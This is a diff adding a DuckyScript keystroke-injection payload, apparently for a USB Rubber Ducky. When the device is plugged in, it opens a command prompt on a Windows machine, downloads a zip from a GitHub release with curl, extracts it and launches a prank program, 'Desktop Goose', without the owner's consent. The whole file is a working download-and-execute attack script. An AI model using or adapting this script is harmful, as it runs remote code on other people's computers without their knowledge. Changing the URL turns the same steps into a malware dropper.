@@ -1,0 +1,25 @@
+REM Download and execute anoying goose
+
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+STRING curl -LO https://github.com/SantiMoncada/DuckyScripts/releases/download/Goose/DesktopGooseWin.zip
+ENTER
+DELAY 5000
+
+STRING tar -xf "DesktopGooseWin.zip"
+ENTER
+DELAY 1000
+
+STRING cd "Desktop Goose v0.31\DesktopGoose v0.31" && GooseDesktop.exe
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
+
+
+
